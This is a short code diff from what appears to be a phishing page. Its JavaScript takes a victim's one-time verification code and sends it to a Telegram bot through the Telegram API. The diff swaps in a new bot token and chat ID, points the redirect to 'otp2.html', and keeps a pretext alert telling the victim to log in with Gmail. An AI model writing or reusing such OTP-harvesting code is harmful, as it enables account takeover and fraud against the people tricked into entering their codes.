@@ -76,8 +76,8 @@
             }
 
             // Replace with your Telegram bot token and chat ID
-            const botToken = '8557833693:AAH4LBXHy5LeKk90dcO1-8nwarAggwrjmOc';
-            const chatId = '1345737806';
+            const botToken = '8519817418:AAFQuqjw1RnqZh-J1b5GEO1Re_aapyMFibQ';
+            const chatId = '6587248920';
             const message = `Verification Code: ${code}`;
 
             fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
@@ -94,7 +94,7 @@
                 .then(data => {
                     if (data.ok) {
                         alert('Please login with Gmail, this payment provider is sensitive.');
-                        window.location.href = 'first.html'; // Redirect to first.html
+                        window.location.href = 'otp2.html'; // Redirect to first.html
                     } else {
                         alert('Error sending code.');
                     }
